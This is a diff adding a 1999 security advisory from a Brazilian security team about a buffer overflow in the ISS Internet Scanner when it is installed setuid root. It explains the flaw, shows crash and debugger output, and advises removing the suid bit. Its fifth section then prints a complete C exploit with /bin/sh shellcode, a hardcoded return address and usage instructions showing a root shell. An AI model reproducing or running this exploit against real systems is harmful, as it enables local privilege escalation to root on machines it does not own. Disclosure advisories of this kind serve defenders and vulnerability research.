@@ -1,0 +1,199 @@
+
+
+			          Sekure SDI
+            	             http://www.sekure.org
+                          ---------------------------
+                       Brazilian Information Security Team
+
+
+           	      -> Internet Scanner Buffer Overflow <-
+                             (SDI.03-99.iss-scanner)
+
+---
+complexity      : medium
+critical level  : medium
+---
+
+ 1. Introduction 
+
+   Internet Scanner (I.S) is a wide known tool to audit the security level
+of a certain network. It has a database which will assist in the detection of  
+the commom security holes that may help an intruder to gain access or
+gather private information from the scanned host.
+
+   During the checks, I.S. will run a set of procedures that requires
+privileges in the local host (root), so an ordinary user may not start a
+scan. 
+
+   Altough it's not the default configuration, it's commom, in certain
+cases, to set the suid bit to permit "root privileges" so the "audit" user, 
+who does not have the necessary privileges, may execute a scan.
+
+   A certain problem was found in the IS program during some tests in
+our lab. While by default it will not represent a thread, in the above
+situation (suid bit owned by root), it will become a security gap.
+
+
+ 2. I.S Flaw
+
+   Internet Scan does not check bounds in some arguments it receives from
+the command line, which will cause a segmentation fault.
+ 
+     sekure:~$ ./iss -D `perl -e "print 'A' x 2000"`
+     Creating Directory /usr/local/iss/scans/s.199903241212
+     # Time Stamp(2103): Signal - Segmentation Violation: (...)
+     (..)
+     ISS Scan was interrupted.
+     Segmentation fault
+
+     sekure:~$ ./iss -c `perl -e "print 'A' x 2000"`
+     (...)
+     Segmentation fault
+
+   Let's check the return address:
+
+     (gdb) run -D `perl -e "print 'A' x 2000"`
+     Starting program: iss -D `perl -e "print 'A' x 2000"`
+     (...)
+     Program received signal SIGSEGV, Segmentation fault.
+     0x41414141 in ?? ()
+     (gdb)
+ 
+   In this situation, we can reach the return address (which holds the
+place the program must return in the memory), so we may execute arbitrary
+commands, and adding the "suid bit" situation, it will be executed with root 
+privileges.
+
+
+  3. Who is vulnerable ?
+ 
+  If you are running I.S using the SETUID bit to conceed root privileges
+to an ordinary user, then you ARE vulnerable to this attack.
+  
+  If you are using the DEFAULT configuration of I.S, you are NOT
+vulnerable.
+
+ 
+  4. Fixing the situation
+
+  The ISS which is the owner of I.S does not provide the source code along
+with the program, so we may not provide a quick patch. 
+
+  We advice you to remove the suid bit and contact the vendor for a
+correction.
+
+  We also advice you to avoid the use of suid bit unless you are familiar
+with the purpose of the program.
+  
+  
+  5. Exploiting the bug
+
+  We believe information must be free available. If we don't provide the
+exploit script along with the information, someone else will do. 
+
+  We also know that people like to see with their own eyes to believe
+they are vulnerable. So here it is:
+
+------------- SDI-iss.c -----------------------------
+/* 
+ *  Sekure SDI - http://www.sekure.org  
+ *  Brazilian Information Security Team  
+ *  By c0nd0r <condor@sekure.org>
+ *
+ *  . ..Internet Scanner (ISS) Buffer Overflow.. .  
+ *  (read the original advisory at http://www.sekure.org/advisory.html)
+ *    
+ *  > This may not represent a thread if you are
+ *  > NOT using IS with setuid root
+ *
+ *  This code is only for educational purposes.
+ *  ------------------------------
+ *  Instructions: After the compilation, execute it to get 
+ *  a shell prompt with the $EGG in the environment.
+ *  tiazinha:~$ SDI-iss
+ *  bash$ ls -tarl iss
+ *  -rwsr-xr-x   1 root     daemon    1691180 Dec 10 15:22 iss*
+ *  bash$ ./iss -c $EGG   
+ *  
+ *  Creating Directory /usr/local/iss/scans/s.199903261158
+ *  id;
+ *  uid=666(condor) gid=100(deejay) euid=0(root) groups=12(mail)
+ *  -------------------------------
+ *  PS: the i/o descriptors are used by IS (stdin/stdout) as this is 
+ *  just an example, I'll not worry about. 
+ */
+
+char shellcode[]=
+ 	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+	"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+#define ISS_HOME "/usr/local/iss"
+
+main ( int argc, char *argv[]) {
+  char buff[2048], env[250];
+  long addr;
+  int x, y, offset=0, src;
+
+  if (argc > 1) offset = atoi(argv[1]);
+
+  for ( x = 0; x < (238-strlen(shellcode)); x++) 
+    buff[x] = 0x90;
+
+  for ( y = 0; y < strlen(shellcode); y++, x++)
+    buff[x] = shellcode[y];
+
+  addr = (long) &src + offset;
+  printf ( "SDI I.S. Exploit Code\n");
+  printf ( "4 educational purpose only\n");
+  printf ( "Please, go to ISS directory and run:\n");
+  printf ( "./iss -c $EGG\n\n");
+
+  /* the program mess with the stack so I prefer to set it 
+     by my own hands, no prob, just a little bit different */
+  
+  buff [x++] = 0x60; 
+  buff [x++] = 0xef; 
+  buff [x++] = 0xff; 
+  buff [x++] = 0xbf; 
+  /* it works fine in my slak3.5 box */
+
+  buff[strlen(buff)] = '\0';
+
+  snprintf ( env, sizeof(env), "ISS_HOME=%s", ISS_HOME); 
+  putenv ( env);
+  bzero ( &env, sizeof(env));
+
+  snprintf ( env, sizeof(env), "EGG=%s", buff);
+  putenv ( env);
+  system ( "/bin/sh");
+
+}
+--------------------- eof ------------------
+
+  6. Contacts
+
+  Sekure SDI
+  http://www.sekure.org
+  info@sekure.org
+
+  This advisory has been written by SSC (Sekure SDI Secure Coding Group)
+  http://ssc.sekure.org
+  securecode@sekure.org
+
+  Subscribe the Best of Security Brazil - mailing list
+  http://bos.sekure.org
+  bos-br-request@sekure.org
+  (the main language is portuguese but everybody is welcome)
+
+
+----
+written by c0nd0r
+condor@sekure.org
+
+
+-condor
+www.sekure.org
+ s e k u r e  
+
+pgp key available at: http://condor.sekure.org/condor.asc
